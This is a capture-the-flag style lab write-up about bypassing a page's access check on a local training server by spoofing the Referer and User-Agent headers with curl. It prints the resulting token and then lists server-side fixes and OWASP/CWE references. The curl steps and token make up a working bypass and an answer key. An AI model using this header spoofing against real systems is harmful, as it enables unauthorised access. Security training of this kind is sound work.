# Header‑based Access Control (Referer / User‑Agent)

**One‑liner:** The page grants access based on **client‑controlled HTTP headers** (`Referer` and `User‑Agent`). By spoofing them, we bypass the check and get a token.

---

## Where

* **URL:** `http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f`
* **Headers used for the “check”:** `Referer`, then `User‑Agent`
* **Auth:** none

**Hint in HTML source:**

```
<!-- You must come from : "https://www.nsa.gov/". -->
```

After sending a `Referer` header, the page hints the required `User‑Agent`:

```
Let's use this browser : "ft_bornToSec". It will help you a lot.
```

---

## How to reproduce (deterministic)

1. Send only the Referer → get the UA hint

```bash
curl -i \
  -H 'Referer: https://www.nsa.gov/' \
  'http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f'
```

**Observed:**

```
Let's use this browser : "ft_bornToSec". It will help you a lot.
```

2. Spoof both headers → get the token

```bash
curl -i \
  -H 'Referer: https://www.nsa.gov/' \
  -H 'User-Agent: ft_bornToSec' \
  'http://127.0.0.1:8080/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f'
```

**Observed token:**

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

---
## Impact

* **Bypass of intended restrictions.** Anyone who can set headers (every client) can access content meant to be "restricted".
* In this lab, that exposes a **token**; in real apps it could expose data or features.

**Severity:** High (no auth, trivial spoofing, leads to secret exposure).

---

## Fix (server‑side — mandatory)

1. **Use proper authN/authZ.** Protect the page with real authentication and role checks tied to a **server‑side session**.
2. **Never trust `Referer`/`User‑Agent` for access decisions.** If you need origin checks (e.g., CSRF mitigations), use them only as **defense‑in‑depth** alongside CSRF tokens.
3. **Signed tokens for access.** For link‑based access, use time‑bound HMAC‑signed tokens (cannot be forged by changing headers).
4. **No secrets in HTML comments.** Don’t leak hints in source; use server logs for diagnostics instead.

---

## References

* OWASP Top 10 **A01:2021 – Broken Access Control**
* CWE‑807: **Reliance on Untrusted Inputs in a Security Decision**
* CWE‑602: **Client‑Side Enforcement of Server‑Side Security**
